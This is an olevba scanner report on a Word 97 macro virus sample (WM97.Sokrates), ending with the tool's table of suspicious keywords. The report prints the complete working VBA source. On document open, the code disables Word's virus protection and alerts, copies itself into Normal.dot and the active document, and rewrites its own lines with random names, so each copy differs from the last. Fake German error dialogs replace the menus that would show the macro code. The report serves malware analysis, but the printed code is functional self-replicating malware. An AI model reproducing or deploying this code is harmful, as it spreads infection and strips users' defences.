olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1-1d7418c07fe6d127afdd8040bef20c985d5d40e7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1-1d7418c07fe6d127afdd8040bef20c985d5d40e7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO wt61je.bas 
in file: Virus.MSWord.VMPCK1-1d7418c07fe6d127afdd8040bef20c985d5d40e7 - OLE stream: 'Macros/VBA/wt61je'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub uf9196()

Randomize
On Error Resume Next

v1$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v2$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v3$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v4$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v5$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v6$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v7$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v8$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v9$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v10$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & Int(Rnd * 99)

wy29$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))
wk68$ = wy29$
ho67$ = Application.VBE.SelectedVBComponent.CodeModule.Name
po51$ = "c:\windows\system\win32sok.sys"
Set ze82 = ActiveDocument.VBProject.VBComponents
Set sq29 = NormalTemplate.VBProject.VBComponents

For i = 1 To ze82.Count
nn91 = ze82.Item(i).CodeModule.CountOfLines
If nn91 = 162 Then ki65 = 1
Next i

For i = 1 To sq29.Count
nn91 = sq29.Item(i).CodeModule.CountOfLines
If nn91 = 162 Then pk25 = 1
Next i

If ki65 = 0 Or pk25 = 0 Then Application.VBE.ActiveVBProject.VBComponents(ho67$).Export po51$

If pk25 = 0 Then
sq29.Import po51$
Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=ho67$, Newname:=wk68$, Object:=wdOrganizerObjectProjectItems
With sq29.Item(wk68$).CodeModule
        .ReplaceLine 1, "Sub " & v10$ & "()"
        .ReplaceLine 17, v1$ & " = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))"
        .ReplaceLine 18, v2$ & " = " & v1$
        .ReplaceLine 19, v3$ & " = Application.VBE.SelectedVBComponent.CodeModule.Name"
        .ReplaceLine 20, v4$ & " = ""c:\windows\system\win32poly.sys"""
        .ReplaceLine 21, "Set " & v5$ & " = ActiveDocument.VBProject.VBComponents"
        .ReplaceLine 22, "Set " & v6$ & " = NormalTemplate.VBProject.VBComponents"
        .ReplaceLine 24, "For i = 1 To " & v5$ & ".Count"
        .ReplaceLine 25, v7$ & " = " & v5$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 26, "If " & v7$ & " = 162 Then " & v8$ & " = 1"
        .ReplaceLine 29, "For i = 1 To " & v6$ & ".Count"
        .ReplaceLine 30, v7$ & " = " & v6$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 31, "If " & v7$ & " = 162 Then " & v9$ & " = 1"
        .ReplaceLine 34, "If " & v8$ & " = 0 Or " & v9$ & " = 0 Then Application.VBE.ActiveVBProject.VBComponents(" & v3$ & ").Export " & v4$
        .ReplaceLine 36, "If " & v9$ & " = 0 Then"
        .ReplaceLine 37, v6$ & ".Import " & v4$
        .ReplaceLine 38, "Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 39, "With " & v6$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 68, "If " & v8$ & " = 0 Then"
        .ReplaceLine 69, v5$ & ".Import " & v4$
        .ReplaceLine 70, "Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 71, "With " & v5$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 102, "Sub AutoClose()"
        .ReplaceLine 106, "Call " & v10$
    End With
    NormalTemplate.Save
End If

If ki65 = 0 Then
ze82.Import po51$
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ho67$, Newname:=wk68$, Object:=wdOrganizerObjectProjectItems
With ze82.Item(wk68$).CodeModule
        .ReplaceLine 1, "Sub " & v10$ & "()"
        .ReplaceLine 17, v1$ & " = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))"
        .ReplaceLine 18, v2$ & " = " & v1$
        .ReplaceLine 19, v3$ & " = Application.VBE.SelectedVBComponent.CodeModule.Name"
        .ReplaceLine 20, v4$ & " = ""c:\windows\system\win32poly.sys"""
        .ReplaceLine 21, "Set " & v5$ & " = ActiveDocument.VBProject.VBComponents"
        .ReplaceLine 22, "Set " & v6$ & " = NormalTemplate.VBProject.VBComponents"
        .ReplaceLine 24, "For i = 1 To " & v5$ & ".Count"
        .ReplaceLine 25, v7$ & " = " & v5$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 26, "If " & v7$ & " = 162 Then " & v8$ & " = 1"
        .ReplaceLine 29, "For i = 1 To " & v6$ & ".Count"
        .ReplaceLine 30, v7$ & " = " & v6$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 31, "If " & v7$ & " = 162 Then " & v9$ & " = 1"
        .ReplaceLine 34, "If " & v8$ & " = 0 Or " & v9$ & " = 0 Then Application.VBE.ActiveVBProject.VBComponents(" & v3$ & ").Export " & v4$
        .ReplaceLine 36, "If " & v9$ & " = 0 Then"
        .ReplaceLine 37, v6$ & ".Import " & v4$
        .ReplaceLine 38, "Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 39, "With " & v6$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 68, "If " & v8$ & " = 0 Then"
        .ReplaceLine 69, v5$ & ".Import " & v4$
        .ReplaceLine 70, "Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 71, "With " & v5$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 102, "Sub AutoOpen()"
        .ReplaceLine 106, "Call " & v10$
    End With
    ActiveDocument.SaveAs ActiveDocument.FullName
End If

End Sub

Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False: Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
Call uf9196
CommandBars("Format").Controls("Formatvorlage...").Delete
CommandBars("Tools").Controls("Vorlagen und Add-Ins...").Delete
If Hour(Now()) = Int(Rnd * 24) Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "-=[ WM97.Sokrates ]=-"
        .Text = "Greetz to Sokrates<LzØ>!" & Chr(13) & Chr(13) & "Jack Twoflower"
        .Animation = msoAnimationCheckingSomething
        .Show
    End With
End If
Application.ScreenUpdating = True: Application.DisplayAlerts = wdAlertsAll
End Sub

Sub ExtrasMakro()
Dim x
ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim DropListBox2__$(0)
DropListBox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"

WordBasic.BeginDialog 620, 280, "Makros"
    WordBasic.Text 7, 6, 93, 13, "Makro&name:", "Text3"
    WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
    WordBasic.PushButton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
    WordBasic.CancelButton 470, 38, 137, 21
    WordBasic.PushButton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
    WordBasic.PushButton 470, 96, 137, 21, "&Bearbeiten", "Definierbar4"
    WordBasic.PushButton 470, 130, 137, 21, "&Erstellen", "Definierbar5"
    WordBasic.PushButton 470, 154, 137, 21, "&Organisieren", "Definierbar6"
    WordBasic.PushButton 470, 178, 137, 21, "&Organisieren...", "Definierbar7"
    WordBasic.Text 7, 200, 93, 13, "Ma&kros in:", "Text1"
    WordBasic.DropListBox 90, 196, 354, 19, DropListBox2__$(), "Listbox2"
    WordBasic.Text 7, 222, 109, 13, "Beschreibung:", "Text2"
    WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog
 
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
x = WordBasic.Dialog.UserDialog(dlg)
Select Case x
    Case 0
        WordBasic.Cancel
    Case 1 To 6
        WordBasic.MsgBox "Nicht genug Arbeitsspeicher! Schließen Sie eine oder mehrere Anwendungen!", "WordBasic Fehler=7", 48
End Select
End Sub
Sub AnsichtCode()
apppath = UCase(Application.StartupPath)
MsgBox "Die erforderliche Datei 'Vba32.dll' im Verzeichnis """ & apppath & """ wurde nicht gefunden. Versuchen Sie die fehlende Datei erneut zu installieren!", 16, "Microsoft Word"
End Sub
Sub AnsichtVBCode()
apppath = UCase(Application.StartupPath)
MsgBox "Die erforderliche Datei 'Vba32.dll' im Verzeichnis """ & apppath & """ wurde nicht gefunden. Versuchen Sie die fehlende Datei erneut zu installieren!", 16, "Microsoft Word"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Vba32.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

